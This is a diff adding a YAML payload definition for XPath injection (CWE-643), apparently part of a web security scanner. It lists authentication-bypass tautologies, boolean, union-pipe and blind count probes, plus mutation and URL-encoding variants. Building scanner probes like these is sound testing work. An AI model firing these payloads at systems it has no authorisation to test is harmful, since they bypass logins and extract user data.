@@ -1,0 +1,40 @@
+family_id: xpath_injection
+description: >-
+  XPath injection curriculum probes (CWE-643). Boolean-based UNION-style
+  XPath, blind time-based XPath, and authentication bypass via or 1=1
+  XPath predicates.
+cwe_ids: [643]
+owasp_top10:
+  - 'A03:2021'
+risk_level: high
+requires_approval: false
+oast_required: false
+payloads:
+  - id: auth_bypass_or
+    template: "' or '1'='1"
+    confidence: suspected
+    notes: XPath authentication bypass via or tautology; matches all user nodes.
+  - id: boolean_and
+    template: "' and '1'='2"
+    confidence: suspected
+    notes: Boolean-false XPath probe; contrast with or tautology confirms injection.
+  - id: union_xpath
+    template: "' | //user/* | '"
+    confidence: suspected
+    notes: XPath UNION pipe injection; extracts sibling user node data via union.
+  - id: blind_xpath_count
+    template: "' and count(//user)>5 and '1'='1"
+    confidence: suspected
+    notes: Blind XPath count probe; enumerates node cardinality without data dump.
+mutations:
+  - name: axis_swap
+    description: Rotate through //user, //password, ancestor::*, //* XPath axis probes.
+  - name: function_rotator
+    description: Try string-length(), substring(), name() function calls for blind extraction.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw XPath predicate in XML/HTML parameter context.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for XPath injection in query-string contexts.
